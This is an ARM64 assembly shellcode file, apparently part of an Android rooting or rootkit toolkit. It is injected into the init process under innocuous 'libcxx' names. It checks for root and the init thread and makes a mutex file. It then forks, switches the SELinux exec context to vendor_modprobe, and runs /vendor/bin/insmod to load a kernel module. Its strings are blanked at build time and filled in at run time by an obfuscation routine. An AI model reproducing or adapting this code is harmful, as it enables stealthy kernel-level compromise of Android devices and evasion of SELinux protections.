    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

/* ── 字符串区：编译期只留零填充，真实内容由 C 侧 obf_asm_init() 运行时写入 ──
   字节数必须与原文逐字节一致（selinux_ctx_end-selinux_ctx 是编译期常量，
   libcxx_ko_target_off 也是编译期偏移），改动会静默破坏 shellcode 语义。 */
mutex_file:
    .global mutex_file
    .skip 9, 0                              /* "/dev/xkm" + NUL */
selinux_ctx:
    .global selinux_ctx
    .skip 23, 0                             /* "u:r:vendor_modprobe:s0" + NUL */
selinux_ctx_end:
attr_exec:
    .global attr_exec
    .skip 21, 0                             /* "/proc/self/attr/exec" + NUL */
exe_path:
    .global exe_path
    .skip 19, 0                             /* "/vendor/bin/insmod" + NUL */
ko_target:
    .global ko_target
    .skip 64, 0                             /* 路径槽：原串 31 字符+NUL=32，再 pad 32 = 64 */
param_soft_reboot:
    .global param_soft_reboot
    .skip 14, 0                             /* "soft_reboot=1" + NUL */

    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data
    .global libcxx_soft_reboot_off
libcxx_soft_reboot_off:
    .int soft_reboot_flag - libcxx_data
soft_reboot_flag:
    .byte 0

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // init main thread gate restored (v197): the trigger context must be
    // the init domain for the vendor_modprobe transition to be permitted.
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/xkm", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr              // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    sub     sp, sp, 32

    // Fork grandchild: set SELinux exec context → execve insmod
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    str     w0, [sp, 24]
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod", [exe_path, ko_target, ["soft_reboot=1",] NULL], NULL)
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    adr     x9, soft_reboot_flag
    ldrb    w9, [x9]
    cbz     w9, insmod_no_sr
    adr     x1, param_soft_reboot
    str     x1, [sp, 16]
    str     xzr, [sp, 24]
    b       do_insmod
insmod_no_sr:
    str     xzr, [sp, 16]
do_insmod:
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    b       myexit

myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
